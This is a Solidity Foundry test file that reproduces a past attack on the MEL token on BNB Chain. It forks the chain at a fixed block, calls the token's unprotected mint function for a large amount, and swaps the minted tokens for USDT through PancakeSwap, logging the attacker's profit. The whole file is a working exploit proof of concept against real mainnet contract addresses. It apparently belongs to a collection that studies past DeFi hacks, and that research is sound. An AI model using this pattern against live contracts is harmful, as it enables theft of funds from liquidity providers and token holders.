// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @Analysis
// https://twitter.com/peckshield/status/1654667621139349505
// @TX
// https://bscscan.com/tx/0x3f1973fe56de5ecd59a815d3b14741cf48385903b0ccfe248f7f10c2765061f7
// @Summary
// critical function lack of access control

interface IMEL is IERC20 {
    function mint(address account, uint256 amount, string memory txId) external returns (bool);
}

contract ContractTest is Test {
    IMEL MEL = IMEL(0x9A1aEF8C9ADA4224aD774aFdaC07C24955C92a54);
    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    Uni_Pair_V2 Pair = Uni_Pair_V2(0x6a8C4448763C08aDEb80ADEbF7A29b9477Fa0628);

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("bsc", 27_960_445);
    }

    function testExploit() external {
        uint256 mintAmount = MEL.balanceOf(address(Pair)) * 50;
        MEL.mint(address(this), mintAmount, "");
        MEL.approve(address(Router), mintAmount);
        address[] memory path = new address[](2);
        path[0] = address(MEL);
        path[1] = address(USDT);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            mintAmount, 0, path, address(this), block.timestamp
        );

        emit log_named_decimal_uint(
            "Attacker USDT balance after exploit", USDT.balanceOf(address(this)), USDT.decimals()
        );
    }
}
